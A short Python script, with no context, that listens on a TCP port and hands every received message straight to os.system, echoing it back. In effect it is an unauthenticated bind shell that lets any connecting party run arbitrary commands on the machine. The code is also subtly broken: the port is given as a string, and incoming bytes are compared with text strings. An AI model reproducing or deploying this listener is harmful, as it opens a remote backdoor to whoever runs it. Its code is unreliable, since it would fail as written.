import socket
import os
import sys

HOST = '192.168.1.3'
PORT = '8888'

sck = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sck.bind ((HOST, PORT))
sck.listen(1)

conn, addr = sck.accept()
print("Connected by: ", addr)

while 1:
    data = conn.recv(1024)
    if not data: break
    if data == "1":
        print("test input 1")
    if data == "2":
        print("test input 2")
    conn.sendall(data)
    os.system(str(data))
    conn.sendall(data)
conn.close()
